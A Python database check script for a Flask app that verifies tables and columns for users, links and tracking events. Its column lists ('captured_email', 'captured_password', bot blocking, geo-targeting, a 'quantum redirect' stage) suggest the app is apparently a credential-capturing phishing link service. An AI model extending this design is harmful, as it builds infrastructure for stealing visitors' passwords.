"""
COMPREHENSIVE PROJECT FIX SCRIPT
=================================
This script addresses all identified issues:
1. Quantum Redirect Integration
2. Database Schema Fixes
3. API Route Fixes
4. Admin/User Data Separation
5. Geolocation Data Capture
6. Mobile Responsiveness Backend Support
"""

import os
import sys

# Add project root to path
sys.path.insert(0, os.path.dirname(__file__))

from src.database import db
from src.main import app
from sqlalchemy import text, inspect
from datetime import datetime

def check_database_connection():
    """Test database connection"""
    print("\n📡 Testing database connection...")
    try:
        with app.app_context():
            db.session.execute(text("SELECT 1"))
            print("✅ Database connection successful")
            return True
    except Exception as e:
        print(f"❌ Database connection failed: {e}")
        return False

def check_and_create_tables():
    """Ensure all tables exist with proper schema"""
    print("\n🔧 Checking and creating missing tables...")
    
    with app.app_context():
        try:
            # Get database inspector
            inspector = inspect(db.engine)
            existing_tables = inspector.get_table_names()
            
            print(f"📋 Found {len(existing_tables)} existing tables")
            
            # Create all tables defined in models
            db.create_all()
            
            # Re-check tables
            existing_tables_after = inspector.get_table_names()
            print(f"✅ Total tables after creation: {len(existing_tables_after)}")
            
            # List all tables
            for table in sorted(existing_tables_after):
                print(f"   ✓ {table}")
            
            return True
            
        except Exception as e:
            print(f"❌ Error creating tables: {e}")
            import traceback
            traceback.print_exc()
            return False

def verify_tracking_event_columns():
    """Verify TrackingEvent table has all required columns"""
    print("\n🔍 Verifying TrackingEvent table columns...")
    
    required_columns = [
        'id', 'link_id', 'timestamp', 'ip_address', 'user_agent',
        'country', 'region', 'city', 'zip_code', 'latitude', 'longitude',
        'timezone', 'isp', 'organization', 'as_number',
        'device_type', 'browser', 'browser_version', 'os', 'os_version',
        'captured_email', 'captured_password', 'status', 'blocked_reason',
        'email_opened', 'redirected', 'on_page', 'unique_id',
        'is_bot', 'referrer', 'session_duration', 'page_views',
        'threat_score', 'bot_type',
        'quantum_enabled', 'quantum_click_id', 'quantum_stage',
        'quantum_processing_time', 'quantum_security_violation',
        'quantum_verified', 'quantum_final_url', 'quantum_error',
        'quantum_security_score', 'is_verified_human'
    ]
    
    with app.app_context():
        try:
            inspector = inspect(db.engine)
            
            if 'tracking_events' not in inspector.get_table_names():
                print("❌ TrackingEvent table does not exist!")
                return False
            
            columns = [col['name'] for col in inspector.get_columns('tracking_events')]
            
            missing_columns = [col for col in required_columns if col not in columns]
            
            if missing_columns:
                print(f"⚠️  Missing columns: {', '.join(missing_columns)}")
                return False
            else:
                print(f"✅ All {len(required_columns)} required columns exist")
                return True
                
        except Exception as e:
            print(f"❌ Error verifying columns: {e}")
            return False

def verify_link_columns():
    """Verify Link table has all required columns"""
    print("\n🔍 Verifying Link table columns...")
    
    required_columns = [
        'id', 'user_id', 'target_url', 'short_code', 'campaign_name',
        'status', 'created_at', 'total_clicks', 'real_visitors',
        'blocked_attempts', 'capture_email', 'capture_password',
        'bot_blocking_enabled', 'geo_targeting_enabled', 'geo_targeting_type',
        'rate_limiting_enabled', 'dynamic_signature_enabled',
        'mx_verification_enabled', 'preview_template_url',
        'allowed_countries', 'blocked_countries',
        'allowed_regions', 'blocked_regions',
        'allowed_cities', 'blocked_cities'
    ]
    
    with app.app_context():
        try:
            inspector = inspect(db.engine)
            
            if 'links' not in inspector.get_table_names():
                print("❌ Links table does not exist!")
                return False
            
            columns = [col['name'] for col in inspector.get_columns('links')]
            
            missing_columns = [col for col in required_columns if col not in columns]
            
            if missing_columns:
                print(f"⚠️  Missing columns: {', '.join(missing_columns)}")
                return False
            else:
                print(f"✅ All {len(required_columns)} required columns exist")
                return True
                
        except Exception as e:
            print(f"❌ Error verifying columns: {e}")
            return False

def verify_user_columns():
    """Verify User table has role field for admin/member separation"""
    print("\n🔍 Verifying User table columns...")
    
    required_columns = [
        'id', 'username', 'email', 'password_hash', 'role', 'status',
        'created_at', 'last_login', 'plan_type', 'subscription_expiry'
    ]
    
    with app.app_context():
        try:
            inspector = inspect(db.engine)
            
            if 'users' not in inspector.get_table_names():
                print("❌ Users table does not exist!")
                return False
            
            columns = [col['name'] for col in inspector.get_columns('users')]
            
            missing_columns = [col for col in required_columns if col not in columns]
            
            if missing_columns:
                print(f"⚠️  Missing columns: {', '.join(missing_columns)}")
                return False
            else:
                print(f"✅ All {len(required_columns)} required columns exist")
                return True
                
        except Exception as e:
            print(f"❌ Error verifying columns: {e}")
            return False

def test_sample_data():
    """Test with sample data"""
    print("\n🧪 Testing sample data creation...")
    
    with app.app_context():
        try:
            from src.models.user import User
            from src.models.link import Link
            from src.models.tracking_event import TrackingEvent
            
            # Check if we can query tables
            user_count = User.query.count()
            link_count = Link.query.count()
            event_count = TrackingEvent.query.count()
            
            print(f"✅ Data counts:")
            print(f"   Users: {user_count}")
            print(f"   Links: {link_count}")
            print(f"   Tracking Events: {event_count}")
            
            return True
            
        except Exception as e:
            print(f"❌ Error querying data: {e}")
            import traceback
            traceback.print_exc()
            return False

def main():
    """Run all fix checks"""
    print("="*60)
    print("COMPREHENSIVE PROJECT FIX SCRIPT")
    print("="*60)
    
    # Step 1: Check database connection
    if not check_database_connection():
        print("\n❌ Cannot proceed without database connection")
        return False
    
    # Step 2: Create missing tables
    if not check_and_create_tables():
        print("\n⚠️  Warning: Some tables may not have been created")
    
    # Step 3: Verify table schemas
    print("\n" + "="*60)
    print("VERIFYING TABLE SCHEMAS")
    print("="*60)
    
    tracking_ok = verify_tracking_event_columns()
    link_ok = verify_link_columns()
    user_ok = verify_user_columns()
    
    # Step 4: Test sample data
    data_ok = test_sample_data()
    
    # Final summary
    print("\n" + "="*60)
    print("FINAL SUMMARY")
    print("="*60)
    
    all_checks = {
        "Database Connection": True,
        "TrackingEvent Schema": tracking_ok,
        "Link Schema": link_ok,
        "User Schema": user_ok,
        "Sample Data Access": data_ok
    }
    
    for check, status in all_checks.items():
        status_icon = "✅" if status else "❌"
        print(f"{status_icon} {check}")
    
    all_passed = all(all_checks.values())
    
    if all_passed:
        print("\n🎉 All checks passed! Database is ready.")
    else:
        print("\n⚠️  Some checks failed. Review the errors above.")
    
    return all_passed

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
